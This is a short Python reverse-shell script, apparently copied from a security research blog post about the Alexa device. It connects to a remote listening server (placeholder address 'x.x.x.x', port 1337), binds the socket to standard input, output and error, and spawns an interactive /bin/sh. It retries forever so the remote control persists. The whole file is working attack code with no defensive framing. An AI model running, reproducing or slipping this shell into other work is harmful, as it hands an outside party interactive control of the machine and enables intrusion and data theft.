#!/usr/bin/python
# reverse shell taken from https://labs.mwrinfosecurity.com/blog/alexa-are-you-listening/

import socket,subprocess,os
host = "x.x.x.x" # Our remote listening server
port = 1337
while True:
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		os.dup2(s.fileno(),0)
		os.dup2(s.fileno(),1)
		os.dup2(s.fileno(),2)
		s.connect((host, port))
		p=subprocess.call(["/bin/sh","-i"])
		s.close()
	except Exception as e:
		s.close()
		continue 
